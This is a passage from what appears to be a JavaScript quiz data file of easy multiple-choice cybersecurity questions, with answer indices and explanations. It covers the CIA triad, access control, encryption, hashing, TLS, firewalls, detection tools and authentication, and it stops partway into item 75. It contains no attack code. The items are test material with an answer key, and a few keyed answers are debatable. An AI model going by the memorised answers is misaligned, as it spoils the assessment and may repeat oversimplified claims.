export default [
    {
        id: "cyber_security-1",
        question: "An attacker intercepts a credit card transaction but only manages to alter the transaction amount without reading the card number. Which pillar of the CIA triad is primarily compromised?",
        options: [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Non-repudiation"
        ],
        answer: 1,
        explanation: "Integrity ensures that data is not altered in transit or at rest by unauthorized parties. Modifying the transaction amount directly violates this principle.",
        difficulty: "Easy",
        topic: "Integrity"
    },
    {
        id: "cyber_security-2",
        question: "A DDoS attack overwhelms a web server, making it unreachable for legitimate users. Which security goal is the attacker targeting?",
        options: [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Authenticity"
        ],
        answer: 2,
        explanation: "Availability ensures that systems and data are accessible to authorized users when needed. A Denial of Service attack directly compromises this.",
        difficulty: "Easy",
        topic: "Availability"
    },
    {
        id: "cyber_security-3",
        question: "A developer stores passwords in plaintext in the database. If the database is leaked, which principle of the CIA triad is directly violated?",
        options: [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Accountability"
        ],
        answer: 0,
        explanation: "Confidentiality ensures that information is accessible only to those authorized to access it. Storing plaintext passwords exposes sensitive data to unauthorized readers.",
        difficulty: "Easy",
        topic: "Confidentiality"
    },
    {
        id: "cyber_security-4",
        question: "In the context of AAA, which component is responsible for tracking user activity, such as the amount of data downloaded during a session?",
        options: [
            "Authentication",
            "Authorization",
            "Accounting",
            "Auditing"
        ],
        answer: 2,
        explanation: "Accounting in the AAA framework measures and records the resources a user consumes, such as session duration or bandwidth usage.",
        difficulty: "Easy",
        topic: "Accounting"
    },
    {
        id: "cyber_security-5",
        question: "A user successfully logs in with valid credentials but is denied access to a specific administrative panel. Which AAA component is enforcing this denial?",
        options: [
            "Authentication",
            "Authorization",
            "Accounting",
            "Identification"
        ],
        answer: 1,
        explanation: "Authorization determines what an authenticated user is permitted to do. Even with valid login credentials, authorization rules can restrict access to specific resources.",
        difficulty: "Easy",
        topic: "Authorization"
    },
    {
        id: "cyber_security-6",
        question: "When a user enters a username and password to prove they are who they claim to be, which security process is occurring?",
        options: [
            "Identification",
            "Authentication",
            "Authorization",
            "Accounting"
        ],
        answer: 1,
        explanation: "Authentication is the process of verifying an identity claimed by a user or system, typically using credentials like passwords or biometrics.",
        difficulty: "Easy",
        topic: "Authentication"
    },
    {
        id: "cyber_security-7",
        question: "What is the primary purpose of a centralized Identity and Access Management (IAM) system in an enterprise?",
        options: [
            "To block all inbound internet traffic",
            "To centrally manage digital identities and their access rights across disparate systems",
            "To encrypt all network traffic automatically",
            "To scan endpoints for malware"
        ],
        answer: 1,
        explanation: "IAM systems provide a centralized framework to manage user identities, provisioning, authentication, and authorization across an organization's entire IT ecosystem.",
        difficulty: "Easy",
        topic: "Identity Management"
    },
    {
        id: "cyber_security-8",
        question: "Which identity management concept involves creating, maintaining, and deleting user accounts throughout their lifecycle in an organization?",
        options: [
            "Single Sign-On",
            "Identity Governance",
        "Provisioning and Deprovisioning",
            "Federated Identity"
        ],
        answer: 2,
        explanation: "Provisioning and deprovisioning handle the lifecycle of a user account, granting access when they join and revoking it when they leave.",
        difficulty: "Easy",
        topic: "Identity Management"
    },
    {
        id: "cyber_security-9",
        question: "In Role-Based Access Control (RBAC), permissions are assigned to which of the following?",
        options: [
            "Individual users",
            "Roles",
            "Resources",
            "Departments"
        ],
        answer: 1,
        explanation: "In RBAC, permissions are grouped into roles, and users are assigned to these roles rather than receiving permissions directly.",
        difficulty: "Easy",
        topic: "RBAC"
    },
    {
        id: "cyber_security-10",
        question: "A company implements a system where access decisions are made based on the user's location, time of day, and device posture. Which access control model is this?",
        options: [
            "Discretionary Access Control (DAC)",
            "Mandatory Access Control (MAC)",
            "Attribute-Based Access Control (ABAC)",
            "Role-Based Access Control (RBAC)"
        ],
        answer: 2,
        explanation: "ABAC evaluates attributes (like location, time, device health) against a set of policies to make dynamic access decisions, rather than relying solely on static roles.",
        difficulty: "Easy",
        topic: "ABAC"
    },
    {
        id: "cyber_security-11",
        question: "Which access control model allows the owner of a file to dictate who can access it?",
        options: [
            "Mandatory Access Control (MAC)",
            "Discretionary Access Control (DAC)",
            "Role-Based Access Control (RBAC)",
            "Rule-Based Access Control"
        ],
        answer: 1,
        explanation: "In DAC, the creator or owner of an object has the discretion to assign permissions to other users.",
        difficulty: "Easy",
        topic: "Access Control"
    },
    {
        id: "cyber_security-12",
        question: "Why is Mandatory Access Control (MAC) typically used in military and government environments?",
        options: [
            "It is the easiest model to implement",
            "It relies entirely on user trust",
            "It enforces strict security labels and clearance levels managed by a central authority",
            "It allows users to share files freely"
        ],
        answer: 2,
        explanation: "MAC uses system-enforced labels (like Secret, Top Secret) and user clearances to strictly control access, preventing users from arbitrarily sharing data.",
        difficulty: "Easy",
        topic: "Access Control"
    },
    {
        id: "cyber_security-13",
        question: "A web application runs its frontend service with root privileges. Which core security principle is being violated?",
        options: [
            "Defense in Depth",
            "Least Privilege",
            "Separation of Duties",
            "Zero Trust"
        ],
        answer: 1,
        explanation: "The Principle of Least Privilege dictates that a user or process should only have the minimum necessary permissions to perform its task.",
        difficulty: "Easy",
        topic: "Least Privilege"
    },
    {
        id: "cyber_security-14",
        question: "Which security model operates on the assumption that threats exist both outside and inside the traditional network boundary?",
        options: [
            "Perimeter Security",
            "Zero Trust",
            "Castle-and-Moat",
            "Implicit Trust"
        ],
        answer: 1,
        explanation: "Zero Trust architecture assumes breach and verifies every access request regardless of whether it originates from inside or outside the network.",
        difficulty: "Easy",
        topic: "Zero Trust"
    },
    {
        id: "cyber_security-15",
        question: "An organization uses a firewall, endpoint antivirus, and requires MFA for remote access. Which strategy are they employing?",
        options: [
            "Least Privilege",
            "Defense in Depth",
            "Zero Trust Architecture",
            "Single Layer of Defense"
        ],
        answer: 1,
        explanation: "Defense in Depth uses multiple overlapping security controls so that if one control fails, others still provide protection.",
        difficulty: "Easy",
        topic: "Defense in Depth"
    },
    {
        id: "cyber_security-16",
        question: "What is the primary difference between a firewall and an Intrusion Detection System (IDS) in a Defense in Depth strategy?",
        options: [
            "Firewalls inspect traffic at layer 7, IDS at layer 3",
            "Firewalls block traffic based on rules, while IDS primarily alerts on suspicious activity",
            "IDS blocks traffic, firewalls only alert",
            "Firewalls are software, IDS are hardware"
        ],
        answer: 1,
        explanation: "A firewall acts as a gatekeeper to block or allow traffic based on predefined rules, whereas an IDS monitors traffic for malicious activity and generates alerts.",
        difficulty: "Easy",
        topic: "Defense in Depth"
    },
    {
        id: "cyber_security-17",
        question: "Using the same encryption key for both encrypting data and calculating a MAC violates which cryptographic concept?",
        options: [
            "Key Stretching",
            "Key Separation",
            "Perfect Forward Secrecy",
            "Key Clustering"
        ],
        answer: 1,
        explanation: "Key separation dictates that different cryptographic keys should be used for different cryptographic purposes to prevent cross-protocol attacks.",
        difficulty: "Easy",
        topic: "Encryption"
    },
    {
        id: "cyber_security-18",
        question: "Which type of encryption uses a single shared key for both encryption and decryption?",
        options: [
            "Asymmetric Encryption",
            "Symmetric Encryption",
            "Hashing",
            "Digital Signatures"
        ],
        answer: 1,
        explanation: "Symmetric encryption uses a single, shared secret key to perform both the encryption and decryption of data.",
        difficulty: "Easy",
        topic: "Symmetric Encryption"
    },
    {
        id: "cyber_security-19",
        question: "What is the main advantage of asymmetric encryption over symmetric encryption?",
        options: [
            "Faster processing speed",
            "Secure key exchange without a pre-shared secret",
            "Smaller key sizes",
            "Resistance to quantum computing"
        ],
        answer: 1,
        explanation: "Asymmetric encryption uses a public/private key pair, allowing secure key exchange and digital signatures without requiring a pre-shared secret key.",
        difficulty: "Easy",
        topic: "Asymmetric Encryption"
    },
    {
        id: "cyber_security-20",
        question: "Which of the following is a block cipher commonly used in symmetric encryption?",
        options: [
            "RSA",
            "AES",
            "Diffie-Hellman",
            "ECC"
        ],
        answer: 1,
        explanation: "AES (Advanced Encryption Standard) is a symmetric block cipher. RSA, Diffie-Hellman, and ECC are asymmetric algorithms.",
        difficulty: "Easy",
        topic: "AES"
    },
    {
        id: "cyber_security-21",
        question: "Why is DES considered insecure for modern cryptographic use?",
        options: [
            "It uses asymmetric keys",
            "Its 56-bit key length is vulnerable to brute-force attacks",
            "It is susceptible to chosen-plaintext attacks only",
            "It can only encrypt text files"
        ],
        answer: 1,
        explanation: "DES uses a 56-bit key, which is too short and can be easily cracked using modern brute-force computing power.",
        difficulty: "Easy",
        topic: "DES"
    },
    {
        id: "cyber_security-22",
        question: "Which encryption standard was designed as a temporary replacement for DES while AES was being developed?",
        options: [
            "RSA-2048",
            "3DES (Triple DES)",
            "Blowfish",
            "IDEA"
        ],
        answer: 1,
        explanation: "3DES applies the DES algorithm three times to each data block, providing stronger security than standard DES as an interim solution.",
        difficulty: "Easy",
        topic: "3DES"
    },
    {
        id: "cyber_security-23",
        question: "What is the standard key size for AES that is approved by the U.S. National Security Agency (NSA) for Top Secret information?",
        options: [
            "128 bits",
            "192 bits",
            "256 bits",
            "512 bits"
        ],
        answer: 2,
        explanation: "AES-256 is the variant approved by the NSA for encrypting Top Secret classified information.",
        difficulty: "Easy",
        topic: "AES"
    },
    {
        id: "cyber_security-24",
        question: "Which mode of operation splits a plaintext message into multiple blocks and encrypts each block independently using the same key?",
        options: [
            "Cipher Block Chaining (CBC)",
            "Electronic Codebook (ECB)",
            "Counter (CTR)",
            "Galois/Counter Mode (GCM)"
        ],
        answer: 1,
        explanation: "ECB mode encrypts each block completely independently. Identical plaintext blocks produce identical ciphertext blocks, making it insecure for most uses.",
        difficulty: "Easy",
        topic: "AES"
    },
    {
        id: "cyber_security-25",
        question: "Which asymmetric algorithm is widely used for secure key exchange but cannot be used for digital signatures?",
        options: [
            "RSA",
            "Diffie-Hellman",
            "ECDSA",
            "DSA"
        ],
        answer: 1,
        explanation: "Diffie-Hellman is a key exchange algorithm that allows two parties to establish a shared secret over an insecure channel, but it does not provide digital signature capabilities.",
        difficulty: "Easy",
        topic: "Diffie-Hellman"
    },
    {
        id: "cyber_security-26",
        question: "Why is Elliptic Curve Cryptography (ECC) preferred over RSA in mobile and IoT environments?",
        options: [
            "ECC is immune to side-channel attacks",
            "ECC provides equivalent security with much smaller key sizes",
            "ECC is faster at decrypting large amounts of data",
            "ECC does not require a random number generator"
        ],
        answer: 1,
        explanation: "ECC offers comparable security to RSA but with significantly smaller key sizes, resulting in lower computational overhead, memory usage, and bandwidth.",
        difficulty: "Easy",
        topic: "ECC"
    },
    {
        id: "cyber_security-27",
        question: "In RSA cryptography, which key is kept secret by the owner to decrypt messages or sign data?",
        options: [
            "Public Key",
            "Private Key",
            "Session Key",
            "Master Key"
        ],
        answer: 1,
        explanation: "The private key in an RSA key pair must be kept strictly confidential by the owner, as it is used for decryption and creating digital signatures.",
        difficulty: "Easy",
        topic: "RSA"
    },
    {
        id: "cyber_security-28",
        question: "What is the primary purpose of a digital signature?",
        options: [
            "To encrypt the payload of a message",
            "To verify the integrity and authenticity of a message",
            "To compress the message for faster transmission",
            "To hide the identity of the sender"
        ],
        answer: 1,
        explanation: "A digital signature provides authentication (proving who sent it) and integrity (proving it was not altered), using the sender's private key.",
        difficulty: "Easy",
        topic: "Digital Signatures"
    },
    {
        id: "cyber_security-29",
        question: "Which component of a Public Key Infrastructure (PKI) is responsible for verifying the identity of an entity before issuing a certificate?",
        options: [
            "Registration Authority (RA)",
            "Certificate Authority (CA)",
            "Validation Authority (VA)",
            "Revocation Authority"
        ],
        answer: 0,
        explanation: "The Registration Authority (RA) handles the identity verification process and forwards the certificate request to the CA for signing.",
        difficulty: "Easy",
        topic: "PKI"
    },
    {
        id: "cyber_security-30",
        question: "What is the function of a Certificate Revocation List (CRL)?",
        options: [
            "To list all valid certificates issued by a CA",
            "To distribute public keys to clients",
            "To identify certificates that have been invalidated before their expiration date",
            "To encrypt communications between the client and server"
        ],
        answer: 2,
        explanation: "A CRL is a list of digital certificates that have been revoked by the issuing CA before their scheduled expiration date.",
        difficulty: "Easy",
        topic: "Certificates"
    },
    {
        id: "cyber_security-31",
        question: "Which protocol is typically used to check the revocation status of a certificate in real-time instead of downloading a full CRL?",
        options: [
            "OCSP (Online Certificate Status Protocol)",
            "LDAP (Lightweight Directory Access Protocol)",
            "Kerberos",
            "SCT (Signed Certificate Timestamp)"
        ],
        answer: 0,
        explanation: "OCSP allows clients to send a query to an OCSP responder to check the current revocation status of a specific certificate.",
        difficulty: "Easy",
        topic: "Certificates"
    },
    {
        id: "cyber_security-32",
        question: "What is a cryptographic hash function primarily designed to do?",
        options: [
            "Encrypt data so it can be reversed later",
            "Generate a fixed-size string of bits from arbitrary input data",
            "Create a symmetric key from a password",
            "Establish a secure tunnel between two hosts"
        ],
        answer: 1,
        explanation: "A cryptographic hash function takes an input of arbitrary length and produces a fixed-size bit string, typically used for integrity verification.",
        difficulty: "Easy",
        topic: "Hashing"
    },
    {
        id: "cyber_security-33",
        question: "Which property of a cryptographic hash function ensures that it is computationally infeasible to find two different inputs that produce the same hash output?",
        options: [
            "Pre-image resistance",
            "Collision resistance",
            "Avalanche effect",
            "Second pre-image resistance"
        ],
        answer: 1,
        explanation: "Collision resistance means it is extremely difficult to find two distinct inputs that result in the exact same hash output.",
        difficulty: "Easy",
        topic: "Hashing"
    },
    {
        id: "cyber_security-34",
        question: "Why is MD5 no longer recommended for cryptographic use?",
        options: [
            "It produces a hash that is too long",
            "It is too slow for modern processors",
            "It has known cryptographic collision vulnerabilities",
            "It can only hash text, not binary data"
        ],
        answer: 2,
        explanation: "MD5 has been cryptographically broken; researchers have demonstrated practical collision attacks where different files produce the same MD5 hash.",
        difficulty: "Easy",
        topic: "MD5"
    },
    {
        id: "cyber_security-35",
        question: "Which hashing algorithm family is currently recommended by NIST as a secure standard?",
        options: [
            "MD5",
            "SHA-1",
            "SHA-2 (e.g., SHA-256)",
            "LANMAN"
        ],
        answer: 2,
        explanation: "The SHA-2 family (including SHA-256, SHA-384, and SHA-512) is currently the standard recommended for cryptographic hashing, as SHA-1 and MD5 are broken.",
        difficulty: "Easy",
        topic: "SHA-2"
    },
    {
        id: "cyber_security-36",
        question: "What is the main difference between SHA-2 and SHA-3?",
        options: [
            "SHA-3 produces shorter hashes than SHA-2",
            "SHA-2 is symmetric, SHA-3 is asymmetric",
            "SHA-3 uses a fundamentally different internal mathematical structure (sponge construction)",
            "SHA-3 is only used for passwords, SHA-2 for files"
        ],
        answer: 2,
        explanation: "SHA-3 relies on a different cryptographic foundation called Keccak, which uses a sponge construction, unlike the Merkle-Damgard structure used in SHA-2.",
        difficulty: "Easy",
        topic: "SHA-3"
    },
    {
        id: "cyber_security-37",
        question: "If a hashed password database is leaked, what prevents an attacker from easily reversing the hashes back to plaintext passwords?",
        options: [
            "The hashes are encrypted",
            "Cryptographic hash functions are mathematically one-way functions",
            "The database uses SSL",
            "The hashes use symmetric encryption"
        ],
        answer: 1,
        explanation: "Cryptographic hash functions are designed to be one-way, meaning it is computationally infeasible to derive the original input from the hash output.",
        difficulty: "Easy",
        topic: "Hashing"
    },
    {
        id: "cyber_security-38",
        question: "What is the purpose of adding a random 'salt' to a password before hashing it?",
        options: [
            "To increase the length of the password",
            "To ensure two identical passwords produce different hash values",
            "To speed up the hashing process",
            "To encrypt the password before hashing"
        ],
        answer: 1,
        explanation: "Salting adds unique random data to each password before hashing, defeating pre-computed attacks like rainbow tables and ensuring identical passwords have different hashes.",
        difficulty: "Easy",
        topic: "Salting"
    },
    {
        id: "cyber_security-39",
        question: "Which of the following algorithms is specifically designed for password hashing rather than general data integrity?",
        options: [
            "SHA-256",
            "MD5",
            "bcrypt",
            "HMAC"
        ],
        answer: 2,
        explanation: "bcrypt is a password hashing function designed to be slow and computationally intensive, making brute-force attacks significantly harder.",
        difficulty: "Easy",
        topic: "Password Hashing"
    },
    {
        id: "cyber_security-40",
        question: "What does HMAC stand for?",
        options: [
            "Hash-based Message Authentication Code",
            "High-speed Message Authentication Cipher",
            "Hashed Main Authentication Control",
            "Hybrid Message Algorithm Code"
        ],
        answer: 0,
        explanation: "HMAC is a mechanism for message authentication using cryptographic hash functions, combining a secret key with the message data.",
        difficulty: "Easy",
        topic: "HMAC"
    },
    {
        id: "cyber_security-41",
        question: "What is the primary purpose of an HMAC in API communication?",
        options: [
            "To encrypt the API payload",
            "To verify the data integrity and authenticity of the API request",
            "To hide the URL endpoint",
            "To compress the JSON payload"
        ],
        answer: 1,
        explanation: "An HMAC ensures that the API request has not been tampered with in transit and confirms it was sent by someone possessing the shared secret key.",
        difficulty: "Easy",
        topic: "HMAC"
    },
    {
        id: "cyber_security-42",
        question: "Which protocol provides secure communication over a computer network by encrypting the traffic between a client and a server?",
        options: [
            "HTTP",
            "FTP",
            "HTTPS",
            "DNS"
        ],
        answer: 2,
        explanation: "HTTPS uses TLS/SSL encryption to secure data transmitted between a web browser and a web server.",
        difficulty: "Easy",
        topic: "HTTPS"
    },
    {
        id: "cyber_security-43",
        question: "Why is sending login credentials over standard HTTP dangerous?",
        options: [
            "HTTP is slower than HTTPS",
            "HTTP does not support form submissions",
            "Data is sent in plaintext and can be intercepted via packet sniffing",
            "HTTP limits password length to 8 characters"
        ],
        answer: 2,
        explanation: "HTTP transmits data in plaintext, making it trivial for an attacker on the same network to intercept and read sensitive information like passwords.",
        difficulty: "Easy",
        topic: "HTTP"
    },
    {
        id: "cyber_security-44",
        question: "What is the function of the Secure flag in an HTTP cookie?",
        options: [
            "It encrypts the cookie's value",
            "It prevents the cookie from being sent over unencrypted HTTP connections",
            "It prevents JavaScript from reading the cookie",
            "It sets the cookie to expire after one hour"
        ],
        answer: 1,
        explanation: "The Secure attribute ensures that the browser only includes the cookie in requests made over HTTPS, preventing it from being exposed over HTTP.",
        difficulty: "Easy",
        topic: "Secure Cookies"
    },
    {
        id: "cyber_security-45",
        question: "Which HTTP header is used to prevent a browser from rendering a page inside an iframe, mitigating Clickjacking attacks?",
        options: [
            "X-Frame-Options",
            "Content-Type",
            "Strict-Transport-Security",
            "X-XSS-Protection"
        ],
        answer: 0,
        explanation: "The X-Frame-Options HTTP header indicates whether a browser should be allowed to render a page in a frame or iframe, preventing clickjacking.",
        difficulty: "Easy",
        topic: "Secure Coding"
    },
    {
        id: "cyber_security-46",
        question: "In the TLS handshake process, what is the primary purpose of the ClientHello message?",
        options: [
            "To send the user's credentials",
            "To propose supported TLS versions and cipher suites to the server",
            "To terminate the connection securely",
            "To verify the server's certificate"
        ],
        answer: 1,
        explanation: "The ClientHello message initiates the TLS handshake and lists the TLS versions and cryptographic algorithms the client supports.",
        difficulty: "Easy",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-47",
        question: "What is a major security improvement in TLS 1.3 over TLS 1.2?",
        options: [
            "Support for static RSA key exchange",
            "Removal of insecure cipher suites and reduction of handshake round trips",
            "Ability to transmit data over UDP",
            "Increased use of MD5 for integrity"
        ],
        answer: 1,
        explanation: "TLS 1.3 removed support for vulnerable algorithms like static RSA and RC4, and streamlined the handshake to just one round trip, improving both security and performance.",
        difficulty: "Easy",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-48",
        question: "Which protocol is widely considered obsolete and insecure for establishing VPN connections due to known vulnerabilities?",
        options: [
            "OpenVPN",
            "WireGuard",
            "PPTP",
            "IPSec"
        ],
        answer: 2,
        explanation: "PPTP (Point-to-Point Tunneling Protocol) has known security flaws, such as weak encryption and vulnerability to MS-CHAPv2 cracking, and should not be used.",
        difficulty: "Easy",
        topic: "VPN"
    },
    {
        id: "cyber_security-49",
        question: "Which IPsec mode encrypts the entire original IP packet, including the original IP header?",
        options: [
            "Transport Mode",
            "Tunnel Mode",
            "Safe Mode",
            "Bridge Mode"
        ],
        answer: 1,
        explanation: "IPsec Tunnel Mode encapsulates the entire original IP packet with a new IP header, providing additional security by hiding the internal network topology.",
        difficulty: "Easy",
        topic: "IPSec"
    },
    {
        id: "cyber_security-50",
        question: "Which protocol is used to securely transfer files over an SSH connection?",
        options: [
            "FTP",
            "TFTP",
            "SFTP",
            "FTPS"
        ],
        answer: 2,
        explanation: "SFTP (SSH File Transfer Protocol) uses the Secure Shell (SSH) protocol to provide secure file transfer capabilities.",
        difficulty: "Easy",
        topic: "SFTP"
    },
    {
        id: "cyber_security-51",
        question: "Why is standard FTP considered insecure for transferring sensitive files?",
        options: [
            "It uses UDP instead of TCP",
            "It transmits data and credentials in plaintext",
            "It does not support directory listings",
            "It limits file sizes to 10MB"
        ],
        answer: 1,
        explanation: "Standard FTP sends both commands (including usernames and passwords) and file data in unencrypted plaintext, making it susceptible to eavesdropping.",
        difficulty: "Easy",
        topic: "FTP"
    },
    {
        id: "cyber_security-52",
        question: "What is the default TCP port for SSH?",
        options: [
            "21",
            "22",
            "23",
            "25"
        ],
        answer: 1,
        explanation: "SSH typically listens on TCP port 22.",
        difficulty: "Easy",
        topic: "SSH"
    },
    {
        id: "cyber_security-53",
        question: "Which DNS record type is used to specify the mail server responsible for accepting emails for a domain?",
        options: [
            "A Record",
            "CNAME Record",
            "MX Record",
            "TXT Record"
        ],
        answer: 2,
        explanation: "The MX (Mail Exchange) record directs email to a specific mail server for a given domain.",
        difficulty: "Easy",
        topic: "DNS Security"
    },
    {
        id: "cyber_security-54",
        question: "What type of attack exploits a vulnerability in the DNS protocol to redirect traffic to a malicious website?",
        options: [
            "ARP Spoofing",
            "DNS Spoofing (Cache Poisoning)",
            "SQL Injection",
            "Cross-Site Scripting"
        ],
        answer: 1,
        explanation: "DNS Spoofing involves corrupting the DNS cache with a forged IP address, causing users to be directed to a malicious site instead of the legitimate one.",
        difficulty: "Easy",
        topic: "DNS Security"
    },
    {
        id: "cyber_security-55",
        question: "What is the primary goal of DNSSEC?",
        options: [
            "To encrypt DNS queries to prevent eavesdropping",
            "To authenticate DNS responses to ensure they originate from the correct source and haven't been tampered with",
            "To speed up DNS resolution times",
            "To block all malicious domains automatically"
        ],
        answer: 1,
        explanation: "DNSSEC adds cryptographic signatures to DNS records, providing authentication and data integrity but does not encrypt the queries themselves.",
        difficulty: "Easy",
        topic: "DNSSEC"
    },
    {
        id: "cyber_security-56",
        question: "Which type of firewall inspects the state of active connections to determine if a packet is part of an established session?",
        options: [
            "Stateless Firewall",
            "Stateful Firewall",
            "Proxy Firewall",
            "Web Application Firewall"
        ],
        answer: 1,
        explanation: "A stateful firewall keeps track of the operating state and characteristics of network connections traversing it to make decisions on allowed traffic.",
        difficulty: "Easy",
        topic: "Stateful Firewall"
    },
    {
        id: "cyber_security-57",
        question: "How does a stateless firewall filter traffic?",
        options: [
            "By tracking the TCP three-way handshake",
            "By inspecting the application layer payload",
            "By evaluating packets individually based on static rules like source/destination IP and ports",
            "By checking the user's identity"
        ],
        answer: 2,
        explanation: "A stateless firewall processes packets in isolation, applying fixed rules without any knowledge of prior packets or connection states.",
        difficulty: "Easy",
        topic: "Stateless Firewall"
    },
    {
        id: "cyber_security-58",
        question: "Which security appliance is specifically designed to protect web applications by inspecting HTTP/HTTPS traffic?",
        options: [
            "Network Firewall",
            "IDS",
            "Web Application Firewall (WAF)",
            "VPN Concentrator"
        ],
        answer: 2,
        explanation: "A WAF operates at Layer 7 (Application Layer) and is designed to protect web applications from attacks like SQLi, XSS, and CSRF.",
        difficulty: "Easy",
        topic: "WAF"
    },
    {
        id: "cyber_security-59",
        question: "What is the key difference between an Intrusion Detection System (IDS) and an Intrusion Prevention System (IPS)?",
        options: [
            "IDS only inspects outbound traffic, IPS inspects inbound",
            "IDS alerts on suspicious activity, while IPS actively blocks it",
            "IDS is a software, IPS is a hardware appliance",
            "IDS uses signatures, IPS uses anomalies"
        ],
        answer: 1,
        explanation: "While both detect malicious activity, an IDS is typically a passive monitoring tool that alerts, whereas an IPS sits inline and actively drops or blocks malicious traffic.",
        difficulty: "Easy",
        topic: "IPS"
    },
    {
        id: "cyber_security-60",
        question: "Which IDS method relies on comparing network traffic against a database of known attack patterns or signatures?",
        options: [
            "Anomaly-based Detection",
            "Heuristic-based Detection",
            "Signature-based Detection",
            "Behavioral-based Detection"
        ],
        answer: 2,
        explanation: "Signature-based detection looks for specific, known patterns (signatures) of malware or attack vectors within network traffic.",
        difficulty: "Easy",
        topic: "IDS"
    },
    {
        id: "cyber_security-61",
        question: "What is the primary function of a Security Information and Event Management (SIEM) system?",
        options: [
            "To block malicious IP addresses",
            "To aggregate, correlate, and analyze log data from various sources for threat detection",
            "To encrypt network traffic",
            "To manage user identities"
        ],
        answer: 1,
        explanation: "SIEM systems collect logs from across the IT infrastructure, correlate the data to identify patterns, and generate alerts for potential security incidents.",
        difficulty: "Easy",
        topic: "SIEM"
    },
    {
        id: "cyber_security-62",
        question: "In a Security Operations Center (SOC), what is the typical first line of defense for analyzing incoming alerts?",
        options: [
            "Tier 3 Threat Hunter",
            "SOC Manager",
            "Tier 1 Analyst",
            "Incident Commander"
        ],
        answer: 2,
        explanation: "Tier 1 Analysts are responsible for initial triage, monitoring, and basic analysis of alerts generated by security tools like SIEMs.",
        difficulty: "Easy",
        topic: "SOC"
    },
    {
        id: "cyber_security-63",
        question: "Which of the following is an example of Endpoint Detection and Response (EDR) capability?",
        options: [
            "Filtering web traffic at the proxy",
            "Monitoring process executions and registry changes on a laptop",
            "Analyzing DNS logs at the server level",
            "Configuring firewall rules on a router"
        ],
        answer: 1,
        explanation: "EDR solutions are installed on endpoints to continuously monitor activities like process creation, file modifications, and network connections to detect and respond to threats.",
        difficulty: "Easy",
        topic: "EDR"
    },
    {
        id: "cyber_security-64",
        question: "How does Extended Detection and Response (XDR) differ from EDR?",
        options: [
            "XDR only focuses on mobile devices",
            "XDR provides broader integration across networks, cloud, and endpoints rather than just endpoints",
            "XDR is a legacy term for antivirus",
            "XDR does not require a central management console"
        ],
        answer: 1,
        explanation: "XDR extends beyond the endpoint to integrate data from networks, emails, cloud workloads, and servers, providing a more holistic view of threats.",
        difficulty: "Easy",
        topic: "XDR"
    },
    {
        id: "cyber_security-65",
        question: "Traditional antivirus software relies primarily on which detection method?",
        options: [
            "Behavioral analysis",
            "Signature matching",
            "Sandboxing",
            "Machine learning"
        ],
        answer: 1,
        explanation: "Traditional AV relies heavily on signature-based detection, comparing files against a database of known malware hashes and patterns.",
        difficulty: "Easy",
        topic: "Antivirus"
    },
    {
        id: "cyber_security-66",
        question: "What is Multi-Factor Authentication (MFA)?",
        options: [
            "Using two different passwords",
            "Requiring a user to provide two or more verification factors from different categories",
            "Logging in from two different devices",
            "Entering a password and a PIN, which are both 'something you know'"
        ],
        answer: 1,
        explanation: "MFA requires verification from multiple independent categories: something you know, something you have, or something you are.",
        difficulty: "Easy",
        topic: "MFA"
    },
    {
        id: "cyber_security-67",
        question: "Which of the following is considered a biometric authentication factor?",
        options: [
            "Password",
            "Hardware token",
            "Fingerprint scan",
            "SMS code"
        ],
        answer: 2,
        explanation: "Biometrics rely on inherent physical or behavioral characteristics, such as fingerprints, facial recognition, or iris scans.",
        difficulty: "Easy",
        topic: "Biometric Authentication"
    },
    {
        id: "cyber_security-68",
        question: "Why are SMS-based One-Time Passwords (OTPs) considered less secure than authenticator app codes?",
        options: [
            "SMS codes expire too quickly",
            "Authenticator apps do not use the internet",
            "SMS is susceptible to SIM swapping and SS7 protocol attacks",
            "SMS codes are too long"
        ],
        answer: 2,
        explanation: "SMS-based 2FA can be bypassed through SIM swapping attacks or by exploiting vulnerabilities in the SS7 telephony protocol to intercept text messages.",
        difficulty: "Easy",
        topic: "2FA"
    },
    {
        id: "cyber_security-69",
        question: "What is the primary function of the OAuth 2.0 protocol?",
        options: [
            "To encrypt data in transit",
            "To delegate authorization to access resources without sharing credentials",
            "To verify user identity",
            "To manage database connections"
        ],
        answer: 1,
        explanation: "OAuth 2.0 is an authorization framework that allows a third-party application to obtain limited access to a user's account without exposing their password.",
        difficulty: "Easy",
        topic: "OAuth"
    },
    {
        id: "cyber_security-70",
        question: "Which protocol is built on top of OAuth 2.0 to provide identity verification and single sign-on (SSO)?",
        options: [
            "SAML",
            "Kerberos",
            "OpenID Connect (OIDC)",
            "RADIUS"
        ],
        answer: 2,
        explanation: "OpenID Connect (OIDC) adds an identity layer on top of OAuth 2.0, allowing clients to verify the identity of the end-user based on authentication performed by an authorization server.",
        difficulty: "Easy",
        topic: "OpenID Connect"
    },
    {
        id: "cyber_security-71",
        question: "What type of token is commonly used in modern web applications to maintain user state after login?",
        options: [
            "Session ID Cookie",
            "JSON Web Token (JWT)",
            "API Key",
            "X.509 Certificate"
        ],
        answer: 1,
        explanation: "JWTs are compact, URL-safe tokens used to securely transmit information between parties as a JSON object, commonly for stateless authentication.",
        difficulty: "Easy",
        topic: "JWT"
    },
    {
        id: "cyber_security-72",
        question: "Which part of a JWT is responsible for containing the actual claims or user data?",
        options: [
            "Header",
            "Payload",
            "Signature",
            "Certificate"
        ],
        answer: 1,
        explanation: "The payload of a JWT contains the claims, which are statements about an entity (typically the user) and additional metadata.",
        difficulty: "Easy",
        topic: "JWT"
    },
    {
        id: "cyber_security-73",
        question: "What is a common security flaw when implementing session management using cookies?",
        options: [
            "Setting the HttpOnly flag",
            "Using HTTPS",
            "Not regenerating the session ID after a successful login",
            "Storing the session ID in the database"
        ],
        answer: 2,
        explanation: "Failing to regenerate the session ID upon login can lead to session fixation attacks, where an attacker forces a user to use a known session ID.",
        difficulty: "Easy",
        topic: "Session Management"
    },
    {
        id: "cyber_security-74",
        question: "What does the HttpOnly flag on a cookie prevent?",
        options: [
            "The cookie from being sent over HTTP",
            "Client-side JavaScript from accessing the cookie",
            "The cookie from expiring",
            "The browser from storing the cookie"
        ],
        answer: 1,
        explanation: "The HttpOnly attribute mitigates Cross-Site Scripting (XSS) attacks by preventing client-side scripts from accessing the protected cookie.",
        difficulty: "Easy",
        topic: "Cookies"
    },
    {
        id: "cyber_security-75",
